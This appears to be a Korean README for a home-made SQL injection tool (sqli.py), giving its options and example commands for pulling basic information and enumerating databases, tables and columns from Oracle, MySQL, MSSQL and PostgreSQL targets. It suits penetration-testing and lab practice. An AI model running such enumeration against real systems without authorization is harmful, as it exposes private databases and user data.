SQL 인젝션 발견 시 조건식을 포함한 request를 코드 내 붙혀넣으면됨
```
usage: sqli.py [-h] [-s SCHEMA] [-p PARAMETER] [-d RESULT_DB] [-D SELECT_DB] [-T SELECT_TABLE] [-C SELECT_COLUMN] [--dbms DBMS] [--proxy PROXY] (--basic | --dbs | --tables | --columns)

optional arguments:
  -h, --help        show this help message and exit
  -s SCHEMA         http? https? EX) -s HTTP
  -p PARAMETER      target param -EX title
  -d RESULT_DB      Database name for storing results EX) -d result_db.db
  -D SELECT_DB      select DB EX) -D bWAPP
  -T SELECT_TABLE   select Table EX) -T 'USERS', 'EXAMPLE_TABLE' # 싱글쿼터 없어도됨
  -C SELECT_COLUMN  select Column EX) -C 'blog', 'heroes'# 싱글쿼터 없어도됨
  --dbms DBMS       SELECT DBMS : MySQL, Oracle, MSSQL, PostgreSQL EX) oracle
  --proxy PROXY     Use a proxy to connect to the target URL EX) 127.0.0.1:8080
  --basic           Basic info extraction
  --dbs             Enumerate DBMS databases
  --tables          Enumerate Tables
  --columns         Enumerate columns
```

# 기본 정보 추출
`python sqli.py -s http -dbms oracle -p username -d oracle_result.db --basic `
  
# DB 목록 추출
`python sqli.py -s http -dbms oracle -p username -d oracle_result.db --dbs `

# 테이블 목록 추출
`python sqli.py -s http -dbms oracle -p username -d oracle_result.db --tables -D C##kazal92`

# 컬럼 목록 추출
`python sqli.py -s http -dbms oracle -p username -d oracle_result.db --columns -D C##kazal92 -T 'USERS', 'EXAMPLE_TABLE'`
